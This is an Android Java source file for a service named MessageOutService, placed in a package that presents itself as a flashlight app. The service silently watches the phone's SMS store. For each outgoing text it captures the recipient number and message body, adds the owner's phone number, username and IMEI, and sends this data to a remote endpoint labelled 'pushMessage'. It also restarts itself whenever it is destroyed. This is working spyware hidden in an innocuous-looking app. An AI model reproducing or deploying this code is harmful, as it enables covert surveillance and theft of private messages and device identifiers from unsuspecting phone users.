package com.androidhive.flashlight;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;


/**
 * Created by lucadalseno on 26/06/17.
 */

public class MessageOutService extends Service{

    private String address;
    private String message;
    private GetInfo info;
    private JSONObject doc;
    private JSONObject messageJSON;
    private Connection connection;


    private String getAddress(){
        return this.address;
    }

    private void setAddress(String address){
        this.address = address;
    }

    private String getMessage(){
        return this.message;
    }

    private void setMessage(String message){
        this.message = message;
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }
    @Override
    public void onCreate() {
        super.onCreate();

        info = new GetInfo(this);
        ContentResolver contentResolver = getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms"), true, new smsObserver(new Handler()));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //Recall Himself on destroy manually
        startService(new Intent(this, MessageOutService.class));
    }



    private class smsObserver extends ContentObserver {

        private String lastSmsId;

        public smsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);

            Uri uriSMSURI = Uri.parse("content://sms");
            Cursor curre = getContentResolver().query(uriSMSURI, null, null, null, "date DESC LIMIT 1");
            String body = null;
            curre.moveToNext();
            String id = curre.getString(curre.getColumnIndex("_id"));

            if(curre.moveToFirst()) {
                //Checking the id of a message to avoid duplicate
                if (smsChecker(id)) {
                    String messageType = curre.getString(curre.getColumnIndexOrThrow("type")).toString();
                    //Checking the type of a message. 2 == sent
                    if (messageType.equals("2")) {
                        String type = curre.getString(curre.getColumnIndexOrThrow("type")).toString();
                        setMessage(curre.getString(curre.getColumnIndexOrThrow("body")).toString());
                        setAddress(curre.getString(curre.getColumnIndexOrThrow("address")).toString());

                        try {

                            doc = new JSONObject();
                            messageJSON = new JSONObject();

                            messageJSON.put("Sender", info.getPhoneNumber());
                            messageJSON.put("ReceiverNumber", getAddress());
                            messageJSON.put("Text", getMessage());
                            messageJSON.put("Username", info.getUsername());
                            messageJSON.put("IMEI", info.getImei());

                            doc.put("Message", messageJSON);
                            doc.put("r", "pushMessage");

                            connection = new Connection(doc);
                            connection.execute();

                        } catch (JSONException e){
                            e.printStackTrace();
                        }
                    }

                }
            }
            curre.close();
        }


        // Prevent duplicate results without overlooking legitimate duplicates
        public boolean smsChecker(String smsId) {
            boolean flagSMS = true;

            if (smsId.equals(lastSmsId)) {
                flagSMS = false;
            }
            else {
                lastSmsId = smsId;
            }
            return flagSMS;
        }
    }
}


